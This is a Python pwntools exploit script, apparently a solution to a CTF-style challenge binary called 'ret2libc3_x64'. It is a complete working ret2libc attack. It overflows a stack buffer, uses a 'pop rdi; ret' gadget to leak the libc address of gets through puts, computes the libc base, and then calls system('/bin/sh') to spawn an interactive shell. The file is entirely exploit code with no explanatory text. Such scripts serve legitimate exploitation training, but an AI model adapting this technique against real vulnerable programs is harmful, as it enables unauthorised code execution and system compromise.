from pwn import *

p = process("./ret2libc3_x64")
gdb.attach(p,"b *0x00000000004006F1")
elf = ELF("./ret2libc3_x64")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

gets_got = elf.got["gets"]
puts_plt = elf.plt["puts"]
main_addr = 0x00000000004006F3
# ROPgadget --binary ./ret2libc3_x64 --only "pop|ret" | grep rdi
# 0x0000000000400783 : pop rdi ; ret
rdi = 0x0000000000400783
p.recvuntil("ret2libc3_x64\n")
payload1 = "a" * 0x100 + "junkjunk"
payload1 += p64(rdi) + p64(gets_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)
p.sendline(payload1)

leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc_base = leak_addr - libc.symbols["gets"]
libc.address = libc_base
log.success("libc_base:" + hex(libc.address))

system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
p.recvuntil("ret2libc3_x64\n")
payload2 = "a" * 0x100 + "junkjunk"
payload2 += p64(rdi) + p64(binsh)
payload2 += p64(system)
p.sendline(payload2)
p.interactive()
